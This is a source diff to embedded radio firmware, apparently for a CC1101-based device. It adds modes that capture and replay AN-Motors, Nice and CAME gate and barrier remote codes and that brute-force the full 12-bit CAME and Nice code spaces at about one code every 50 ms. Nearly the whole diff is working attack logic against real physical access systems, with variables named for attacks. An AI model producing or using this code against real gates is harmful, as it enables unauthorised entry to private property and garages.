@@ -52,6 +52,7 @@ void loop1()
         mySwitch.disableReceive();
         mySwitch.disableTransmit();
         mySwitch.resetAvailable();
+        detachInterrupt(GD0_PIN_CC);
         digitalWrite(GD0_PIN_CC, LOW);
         currentLedMode = LED_BLINK_SLOW;
         initialized = false;
@@ -266,6 +267,158 @@ void loop1()
         attackTimer = millis();
         DBG("Successfully sent!\n");
         DBG("Code: %d, Protocol: %d\n", mySwitch.getReceivedValue(), mySwitch.getReceivedProtocol());
+      }
+
+      break;
+    }
+    case HF_BARRIER_SCAN:
+    {
+      if (!initialized)
+      {
+        pinMode(GD0_PIN_CC, INPUT);
+        ELECHOUSE_cc1101.SetRx(radioFrequency);
+        attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
+        currentLedMode = LED_BLINK_FAST;
+        initialized = true;
+      }
+
+      if (barrierCaptured)
+      {
+        barrierCaptured = false;
+
+        // Repeating the signal
+        pinMode(GD0_PIN_CC, OUTPUT);
+        ELECHOUSE_cc1101.SetTx(radioFrequency);
+
+        if (barrierProtocol == 0)
+        {
+          sendANMotors(barrierCodeMain, barrierCodeAdd);
+        }
+        else if (barrierProtocol == 1)
+        {
+          sendNice(barrierCodeMain);
+        }
+        else if (barrierProtocol == 2)
+        {
+          sendCame(barrierCodeMain);
+        }
+
+        DBG("Successfully sent!\n");
+        DBG("Code: %d, Protocol: %d\n", barrierCodeMain, barrierProtocol);
+
+        initialized = false;
+      }
+
+      break;
+    }
+    case HF_BARRIER_REPLAY:
+    {
+      static uint32_t attackTimer = millis();
+
+      if (!initialized)
+      {
+        pinMode(GD0_PIN_CC, INPUT);
+        ELECHOUSE_cc1101.SetRx(radioFrequency);
+        attachInterrupt(digitalPinToInterrupt(GD0_PIN_CC), captureBarrierCode, CHANGE);
+        currentLedMode = LED_BLINK_FAST;
+        initialized = true;
+      }
+
+      if (barrierCaptured)
+      {
+        barrierCaptured = false;
+
+        // Repeating the signal
+        pinMode(GD0_PIN_CC, OUTPUT);
+        detachInterrupt(GD0_PIN_CC);
+        ELECHOUSE_cc1101.SetTx(radioFrequency);
+
+        attackIsActive = true;
+      }
+
+      if (attackIsActive && millis() - attackTimer >= 1000)
+      {
+        if (barrierProtocol == 0)
+        {
+          sendANMotors(barrierCodeMain, barrierCodeAdd);
+        }
+        else if (barrierProtocol == 1)
+        {
+          sendNice(barrierCodeMain);
+        }
+        else if (barrierProtocol == 2)
+        {
+          sendCame(barrierCodeMain);
+        }
+
+        DBG("Successfully sent!\n");
+        DBG("Code: %d, Protocol: %d\n", barrierCodeMain, barrierProtocol);
+
+        attackTimer = millis();
+      }
+
+      break;
+    }
+    case HF_BARRIER_BRUTE_CAME:
+    {
+      if (!initialized)
+      {
+        pinMode(GD0_PIN_CC, OUTPUT);
+        ELECHOUSE_cc1101.SetTx(radioFrequency);
+        currentLedMode = LED_BLINK_FAST;
+        initialized = true;
+      }
+
+      static int16_t barrierBruteIndex = 4095;
+      static uint32_t lastSendTime = millis();
+
+      if (millis() - lastSendTime > 50)
+      {
+        lastSendTime = millis();
+
+        if (barrierBruteIndex >= 0)
+        {
+          sendCame(barrierBruteIndex);
+          DBG("CAME BRUTE: Code: %d\n", barrierBruteIndex);
+          barrierBruteIndex--;
+        }
+        if (barrierBruteIndex < 0)
+        {
+          barrierBruteIndex = 4095;
+          currentMode = IDLE;
+        }
+      }
+
+      break;
+    }
+    case HF_BARRIER_BRUTE_NICE:
+    {
+      if (!initialized)
+      {
+        pinMode(GD0_PIN_CC, OUTPUT);
+        ELECHOUSE_cc1101.SetTx(radioFrequency);
+        currentLedMode = LED_BLINK_FAST;
+        initialized = true;
+      }
+
+      static int16_t barrierBruteIndex = 4095;
+      static uint32_t lastSendTime = millis();
+
+      if (millis() - lastSendTime > 50)
+      {
+        lastSendTime = millis();
+
+        if (barrierBruteIndex >= 0)
+        {
+          sendNice(barrierBruteIndex);
+          DBG("CAME NICE: Code: %d\n", barrierBruteIndex);
+          barrierBruteIndex--;
+        }
+        if (barrierBruteIndex < 0)
+        {
+          barrierBruteIndex = 4095;
+          currentMode = IDLE;
+        }
       }
 
       break;
